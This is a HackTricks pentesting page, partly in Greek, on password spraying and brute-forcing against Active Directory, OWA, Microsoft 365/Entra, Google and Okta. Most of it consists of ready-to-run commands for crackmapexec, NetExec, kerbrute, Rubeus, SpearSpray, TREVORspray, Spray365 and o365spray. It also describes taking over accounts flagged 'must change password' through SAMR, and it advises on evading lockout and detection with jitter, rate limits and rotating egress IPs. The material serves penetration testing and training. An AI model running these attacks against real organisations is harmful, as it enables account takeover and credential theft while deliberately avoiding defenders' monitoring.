# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Μόλις βρεις αρκετά **valid usernames** μπορείς να δοκιμάσεις τα πιο **common passwords** (έχοντας υπόψη το password policy του environment) με κάθε έναν από τους users που ανακάλυψες.\
By **default** το **minimum** **password** **length** είναι **7**.

Λίστες από common usernames μπορεί επίσης να είναι χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Πρόσεξε ότι **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

Αν έχεις κάποια user credentials ή ένα shell ως domain user μπορείς να **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Εκμετάλλευση από Linux (ή όλα)

- Χρησιμοποιώντας **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Χρησιμοποιώντας **NetExec (CME successor)** για στοχευμένο, low-noise spraying σε SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείς να δηλώσεις τον αριθμό των προσπαθειών για να αποφύγεις τα lockouts):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Χρήση [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - **ΔΕΝ ΠΡΟΤΕΙΝΕΤΑΙ**, ΜΕΡΙΚΕΣ ΦΟΡΕΣ ΔΕΝ ΛΕΙΤΟΥΡΓΕΙ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Με το `scanner/smb/smb_login` module του **Metasploit**:

![](<../../images/image (745).png>)

- Χρησιμοποιώντας **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Από Windows

- Με έκδοση του [Rubeus](https://github.com/Zer1t0/Rubeus) με brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Με [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει χρήστες από το domain από προεπιλογή και θα πάρει το password policy από το domain και θα περιορίσει τις προσπάθειες ανάλογα με αυτό):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Με [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identify and Take Over "Password must change at next logon" Accounts (SAMR)

Μια low-noise technique είναι να κάνεις spray ένα benign/empty password και να εντοπίζεις accounts που επιστρέφουν STATUS_PASSWORD_MUST_CHANGE, κάτι που δείχνει ότι το password έληξε αναγκαστικά και μπορεί να αλλάξει χωρίς να γνωρίζεις το παλιό.

Workflow:
- Enumerate users (RID brute via SAMR) για να δημιουργήσεις τη target list:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Κάνε spray με κενό password και συνέχισε στα hits για να καταγράψεις accounts που πρέπει να αλλάξουν password στο επόμενο logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Για κάθε επιτυχία, άλλαξε το password μέσω SAMR με το module του NetExec (δεν χρειάζεται το παλιό password όταν έχει οριστεί το "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Λειτουργικές σημειώσεις:
- Βεβαιώσου ότι το ρολόι του host σου είναι συγχρονισμένο με το DC πριν από Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
- Ένα [+] χωρίς (Pwn3d!) σε ορισμένα modules (π.χ. RDP/WinRM) σημαίνει ότι τα creds είναι έγκυρα αλλά ο λογαριασμός δεν έχει interactive logon rights.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Το Kerberos pre-auth–based spraying μειώνει το noise σε σχέση με SMB/NTLM/LDAP bind attempts και ευθυγραμμίζεται καλύτερα με τα AD lockout policies. Το SpearSpray συνδυάζει LDAP-driven targeting, a pattern engine, και policy awareness (domain policy + PSOs + badPwdCount buffer) για να κάνει spray με ακρίβεια και ασφάλεια. Μπορεί επίσης να tag compromised principals σε Neo4j για BloodHound pathing.

Key ideas:
- LDAP user discovery με paging και υποστήριξη LDAPS, προαιρετικά με custom LDAP filters.
- Domain lockout policy + PSO-aware filtering ώστε να αφήνεται configurable attempt buffer (threshold) και να αποφεύγεται το locking των users.
- Kerberos pre-auth validation με fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation με variables όπως names και temporal values που προέρχονται από το pwdLastSet κάθε user.
- Throughput control με threads, jitter, και max requests per second.
- Προαιρετική ενσωμάτωση Neo4j για να επισημαίνονται οι owned users για BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Στοχοθέτηση και έλεγχος μοτίβου:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth and safety controls:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enrichment:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Επισκόπηση συστήματος Pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiples tools for p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Για cloud spraying, πρώτα εντόπισε αν το tenant είναι **managed**, **federated**, ή **hybrid**, επειδή το endpoint και η συμπεριφορά του lockout μπορεί να διαφέρουν από το on-prem AD. Στο Microsoft Entra, το **Smart Lockout** αλλάζει το πώς οι επαναλαμβανόμενες προσπάθειες καταναλώνουν το lockout budget:

- Η επανάληψη του **ίδιου bad password** δεν συνεχίζει να αυξάνει το lockout counter, αλλά η δοκιμή **νέων candidates** το κάνει.
- Οι **familiar** και **unfamiliar** locations έχουν **ξεχωριστά** counters.
- Τα tenants που χρησιμοποιούν **pass-through authentication (PTA)** δεν επωφελούνται από το bad-password hash tracking, οπότε αντιμετώπισέ τα περισσότερο σαν κλασικούς lockout-sensitive στόχους.

Στην πράξη, κάνε spray **ένα password ανά round**, κράτα αρκετή απόσταση ανάμεσα στα rounds, και προτίμησε tooling που μπορεί να ανακαλύψει το πραγματικό auth flow του tenant πριν στείλει guesses.

- Με το [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), μπορείς να κάνεις recon το tenant, να ανακαλύψεις το `token_endpoint`, να κάνεις spray σε `msol`/`adfs`/`owa`/`okta`, και να κάνεις rotate την traffic μέσω πολλαπλών egress IPs:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Με [**Spray365**](https://github.com/MarkoH17/Spray365), μπορείτε να προ-δημιουργήσετε ένα επαναληπτό **execution plan**, να τυχαιοποιήσετε τη σειρά auth και να επιβάλετε ένα **minimum delay per user** για να μείνετε εκτός του lockout window:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Με [**o365spray**](https://github.com/0xZDH/o365spray), μπορείτε να επαληθεύσετε το tenant, να κάνετε enumerate users με modules όπως `onedrive`, και να κάνετε spray μέσω `oauth2` ή `adfs` ενώ διατηρείτε **μία προσπάθεια ανά user** ανά lockout window. Αν έχετε ήδη ένα FireProx API, περάστε το με `--proxy-url` για να διανείμετε τα source IPs:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Πρόσφατες τεχνικές operators έχουν επίσης στραφεί προς το **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) υποστηρίζει time windows, password shuffling, ADFS/M365 spraying, και automatic post-auth exfiltration. Πρόσφατη πραγματική κατάχρηση χρησιμοποίησε επίσης **Microsoft Teams API** account enumeration και **AWS region rotation** για να διασπείρει spray waves σε πολλαπλές source geographies.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
